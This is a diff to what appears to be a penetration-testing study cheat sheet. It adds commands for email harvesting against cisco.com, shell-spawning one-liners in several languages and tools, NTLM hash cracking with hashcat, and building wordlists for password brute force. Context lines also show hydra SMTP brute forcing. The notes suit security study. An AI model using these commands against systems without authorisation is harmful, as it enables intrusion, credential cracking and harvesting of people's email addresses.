@@ -19,6 +19,7 @@ Intial Recon:
   - Zone transfer misconfig: dnsrecon
   - Brute force host names:
     for ip in $(seq 0 255); do host 192.168.1.$ip; done
+  - theharvester -d cisco.com -b google>google.txt  -Check for emails
 --------------------------------------------------------
 Port scanning:
 Inital port scan all ports on ip:
@@ -87,3 +88,33 @@ hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
 process.h, string.h, winbase.h, windows.h, winsock2.h - Windows exploit code
 arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h - Linux exploit code
 -----------------------------------------------------------------
+TTY Shells:
+Python TTY Shell Trick
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+
+Spawn Interactive sh shell
+/bin/sh -i
+
+Spawn Perl TTY Shell
+exec "/bin/sh";
+perl —e 'exec "/bin/sh";'
+
+Spawn Ruby TTY Shell
+exec "/bin/sh"
+
+Spawn Lua TTY Shell
+os.execute('/bin/sh')
+
+Spawn TTY Shell from Vi. Run shell commands from vi:
+:!bash
+
+Spawn TTY Shell NMAP
+!sh
+-------------------------------------------------------------------------
+Passwords:
+hashcat -m 1000 -a 0 /hash.txt /usr/share/wordlists/rockyou.txt  (-m is for NTLM hash cracking)
+hash-identifier - Check the type of hash
+cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt  - Obtain words on megacorp.com with size 6 and up (Create password to brute force)
+crunch - Create password list
+--------------------------------------------------------------------------
